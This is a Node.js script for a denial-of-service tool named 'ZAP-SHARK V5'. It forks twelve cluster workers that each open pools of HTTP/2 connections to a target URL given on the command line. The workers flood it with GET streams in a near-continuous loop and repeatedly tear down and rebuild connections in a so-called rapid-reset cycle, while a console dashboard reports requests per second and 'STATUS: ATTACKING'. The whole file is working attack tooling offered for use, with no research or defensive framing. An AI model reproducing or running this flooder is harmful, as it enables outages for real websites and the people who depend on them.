const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');

class ZAPSHARK_V5 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.workers = [];
        this.workerCount = 12;
        this.rapidReset = 450;
    }

    // === WORKER CREATION ===
    createWorker(id) {
        return new Promise((resolve) => {
            const worker = cluster.fork({
                WORKER_ID: id,
                TARGET_URL: this.targetUrl,
                HOSTNAME: this.hostname,
                RAPID_RESET: this.rapidReset
            });

            worker.on('message', (msg) => {
                if (msg.type === 'stats') {
                    this.totalRequests += msg.requests || 0;
                    this.requestsSinceLastCalc += msg.rpsDelta || 0;
                }
                if (msg.type === 'ready') {
                    this.workers.push(worker);
                    resolve();
                }
            });

            worker.on('exit', () => {
                setTimeout(() => this.createWorker(id), 1000);
            });
        });
    }

    // === STATS ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const hours = Math.floor(runtime / 3600);
        const minutes = Math.floor((runtime % 3600) / 60);
        const seconds = runtime % 60;
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    // === DISPLAY ===
    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log('ZAP-SHARK V5 | TØR');
        console.log('='.repeat(40));
        console.log(`RUNTIME: ${this.formatRuntime()} | STATUS: ${this.status}`);
        console.log(`WORKERS: ${this.workers.length}/${this.workerCount} | RESET: ${this.rapidReset}ms`);
        console.log('='.repeat(40));
        console.log(`TRS-SHARK — ${this.totalRequests.toLocaleString()}`);
        console.log(`RPS-SHARK — ${this.currentRPS.toFixed(1)}`);
        console.log('='.repeat(40));
    }

    // === MAIN ===
    async start() {
        console.log('=== ZAP-SHARK V5 | TØR ===');
        console.log('Workers: 12 | Conns: 144 | Rapid Reset: 450ms');
        console.log('Target:', this.targetUrl);
        console.log('='.repeat(50));

        if (cluster.isMaster) {
            // CREATE WORKERS
            for (let i = 0; i < this.workerCount; i++) {
                await this.createWorker(i);
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            // DISPLAY LOOP
            setInterval(() => {
                this.updateDisplay();
            }, 100);

            // BROADCAST CONTROLS
            process.on('SIGINT', () => {
                console.log('\n=== STOPPING V5 ===');
                this.workers.forEach(w => w.kill());
                process.exit(0);
            });

        } else {
            // === WORKER CODE ===
            const WorkerZAPSHARK = require('./worker-shark.js');
            const worker = new WorkerZAPSHARK(
                process.env.TARGET_URL,
                process.env.HOSTNAME,
                parseInt(process.env.RAPID_RESET),
                parseInt(process.env.WORKER_ID)
            );
            worker.start();
        }
    }
}

// WORKER MODULE (save as worker-shark.js)
class WorkerZAPSHARK {
    constructor(targetUrl, hostname, rapidReset, workerId) {
        this.targetUrl = targetUrl;
        this.hostname = hostname;
        this.rapidReset = rapidReset;
        this.workerId = workerId;
        
        this.connectionPool = [];
        this.connCount = 12;
        this.totalRequests = 0;
        this.lastReset = Date.now();
        
        this.running = true;
    }

    createConnection() {
        try {
            const client = http2.connect(this.targetUrl, {
                maxSessionMemory: 4096,
                maxDeflateDynamicTableSize: 1024
            });
            client.setMaxListeners(50);
            client.on('error', () => {});
            return client;
        } catch (err) {
            return null;
        }
    }

    buildPool() {
        this.connectionPool = [];
        for (let i = 0; i < this.connCount; i++) {
            const conn = this.createConnection();
            if (conn) this.connectionPool.push(conn);
        }
    }

    rapidResetCycle() {
        const now = Date.now();
        if (now - this.lastReset >= this.rapidReset) {
            const resetCount = Math.ceil(this.connectionPool.length * 0.4);
            for (let i = 0; i < resetCount; i++) {
                const idx = Math.floor(Math.random() * this.connectionPool.length);
                if (this.connectionPool[idx]) {
                    try { this.connectionPool[idx].destroy(); } catch (e) {}
                    this.connectionPool[idx] = this.createConnection();
                }
            }
            this.lastReset = now;
        }
    }

    sendRequest() {
        if (this.connectionPool.length === 0) return;

        // MAX STREAMS PER TICK
        for (let i = 0; i < 8; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            if (!client) continue;

            try {
                const req = client.request({
                    ':method': 'GET',
                    ':path': '/',
                    ':authority': this.hostname
                });

                req.on('response', () => {
                    req.destroy();
                });

                req.on('error', () => {
                    req.destroy();
                });

                req.on('close', () => {
                    this.totalRequests++;
                    // SEND STATS TO MASTER EVERY 100 REQS
                    if (this.totalRequests % 100 === 0) {
                        process.send({
                            type: 'stats',
                            requests: 100,
                            rpsDelta: 100
                        });
                    }
                });

                req.end();

            } catch (err) {
                this.totalRequests++;
            }
        }
    }

    start() {
        this.buildPool();
        
        // SEND READY SIGNAL
        process.send({ type: 'ready' });
        
        // MAIN LOOP
        const interval = setInterval(() => {
            if (!this.running) {
                clearInterval(interval);
                return;
            }
            
            this.rapidResetCycle();
            this.sendRequest();
            
            // REBUILD IF EMPTY
            if (this.connectionPool.length === 0) {
                this.buildPool();
            }
        }, 0.1);
        
        // CLEANUP
        process.on('message', (msg) => {
            if (msg === 'stop') {
                this.running = false;
                this.connectionPool.forEach(c => {
                    try { c.destroy(); } catch (e) {}
                });
            }
        });
    }
}

// EXPORT FOR WORKER
if (require.main === module && cluster.isWorker) {
    const worker = new WorkerZAPSHARK(
        process.env.TARGET_URL,
        process.env.HOSTNAME,
        parseInt(process.env.RAPID_RESET),
        parseInt(process.env.WORKER_ID)
    );
    worker.start();
}

// MAIN EXECUTION
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v5.js https://target.com');
    process.exit(1);
}

// INCREASE MEMORY FOR MASTER
process.env.UV_THREADPOOL_SIZE = 128;

const shark = new ZAPSHARK_V5(target);
shark.start();
